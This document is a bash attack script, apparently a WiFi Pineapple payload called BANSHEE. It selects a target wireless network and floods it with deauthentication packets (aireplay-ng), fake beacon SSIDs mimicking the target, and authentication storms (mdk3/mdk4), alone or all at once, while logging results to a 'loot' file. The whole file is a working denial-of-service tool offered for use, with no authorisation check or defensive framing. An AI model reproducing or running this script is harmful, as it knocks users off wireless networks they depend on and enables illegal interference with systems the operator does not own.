#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# BANSHEE - Broadcast Attack Network Signal Harasser & Environment Eliminator
# Developed by: bad-antics
# 
# Multi-vector chaos - hits everything at once with screaming attacks
#═══════════════════════════════════════════════════════════════════════════════

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

PROMPT "    ╔╗ ╔═╗╔╗╔╔═╗╦ ╦╔═╗╔═╗
    ╠╩╗╠═╣║║║╚═╗╠═╣║╣ ║╣ 
    ╚═╝╩ ╩╝╚╝╚═╝╩ ╩╚═╝╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━
The Wireless Wail

Multi-vector attack
that screams across
all frequencies.

CHAOS INCARNATE
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to SCREAM."

# Scan for targets
nullsec_select_target
[ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "No target selected!"; exit 1; }

PROMPT "TARGET LOCKED:
$SELECTED_SSID

BANSHEE MODES:
1. Wail (deauth flood)
2. Shriek (beacon chaos)
3. Howl (auth storms)
4. Scream (ALL attacks)

Choose your cry..."

MODE=$(NUMBER_PICKER "Mode (1-4):" 4)
DURATION=$(NUMBER_PICKER "Duration (sec):" 60)

INTERFACE="wlan0"
airmon-ng check kill 2>/dev/null
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

iwconfig $MON_IF channel $SELECTED_CHANNEL 2>/dev/null

LOOT_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 BANSHEE - Attack Log
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Target: $SELECTED_SSID ($SELECTED_BSSID)
 Channel: $SELECTED_CHANNEL
 Mode: $MODE
 Duration: ${DURATION}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

LOG "BANSHEE WAILS..."
SPINNER_START "Screaming at $SELECTED_SSID..."

launch_wail() {
    timeout $DURATION aireplay-ng --deauth 0 -a $SELECTED_BSSID $MON_IF 2>/dev/null &
    echo "[$(date)] WAIL: Deauth flood on $SELECTED_BSSID" >> "$LOOT_FILE"
}

launch_shriek() {
    # Beacon flood with variations of target SSID
    for i in {1..10}; do
        FAKE_SSID="${SELECTED_SSID:0:$((${#SELECTED_SSID}-2))}$RANDOM"
        echo "$FAKE_SSID" >> /tmp/banshee_beacons.txt
    done
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    fi
    echo "[$(date)] SHRIEK: Beacon chaos launched" >> "$LOOT_FILE"
}

launch_howl() {
    # Authentication storms
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    fi
    echo "[$(date)] HOWL: Auth storm on $SELECTED_BSSID" >> "$LOOT_FILE"
}

case $MODE in
    1) launch_wail ;;
    2) launch_shriek ;;
    3) launch_howl ;;
    4)
        launch_wail
        launch_shriek
        launch_howl
        ;;
esac

sleep $DURATION

SPINNER_STOP

# Count packets sent
DEAUTH_COUNT=$(grep -c "Sending DeAuth" /tmp/*.log 2>/dev/null || echo "1000+")

echo "" >> "$LOOT_FILE"
echo "[$(date)] BANSHEE silenced after ${DURATION}s" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"
echo " NullSec Pineapple Suite | Developed by: bad-antics" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"

# Cleanup
pkill -f "aireplay\|mdk" 2>/dev/null
rm -f /tmp/banshee_beacons.txt
airmon-ng stop $MON_IF 2>/dev/null

PROMPT "BANSHEE SILENCED
━━━━━━━━━━━━━━━━━━━━━━━━━
The screaming stops.

Target: $SELECTED_SSID
Duration: ${DURATION}s
Mode: $MODE

Chaos unleashed.

Log: $LOOT_FILE
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
